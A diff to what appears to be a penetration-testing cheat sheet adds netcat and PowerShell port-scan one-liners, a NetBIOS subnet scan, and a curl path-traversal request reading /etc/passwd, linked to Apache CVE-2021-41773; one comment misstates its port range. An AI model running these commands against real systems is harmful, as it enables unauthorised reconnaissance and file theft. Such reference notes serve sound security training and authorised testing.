@@ -34,6 +34,17 @@ Flags: 128 concurrent checks, timeout after 1000 ms
 ## Exploit Search
     searchsploit "service-version"
 
+## nmap-less
+	nc -nv -w 1 -z 123.123.123.123 100-150
+unix netcat portscan on ports 100 to 150  
+
+	150..200 | ForEach-Object {Test-NetConnection 123.123.123.123 -Port $_}
+powershell portscan on ports 100 to 150  
+
+## SMB recon
+	sudo nbtscan -r 123.123.123.0/24
+list NetBIOS name  
+
 # STAGE 2 - INITIAL ACCESS
 ## Netcat Shell Catching
 	nc -lvnp 5000
@@ -87,6 +98,10 @@ PHP webshell
 ### Magic hashes
 PHP Loose comparison with magic hashes (0e...)  
 Set inputs to 0  
+
+### URL Path traversal
+	curl --path-as-is http://123.123.123.123/../../../../../etc/passwd
+`--path-as-is` is required as curl will squash `../` by default  
 
 ## Injections
 ### Commands injections
@@ -345,3 +360,4 @@ GET/POST parameters
 |Cacti|1.2.29|CVE-2025-24367|https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC|
 |pkexec||CVE-2021-4034|https://ine.com/blog/exploiting-pwnkit-cve-2021-4034-techniques-and-defensive-measures|
 |vsftpd|2.3.4|CVE-2011-2523|https://www.exploit-db.com/exploits/49757|
+|Apache|2.4.49|CVE-2021-41773|see url path traversal|
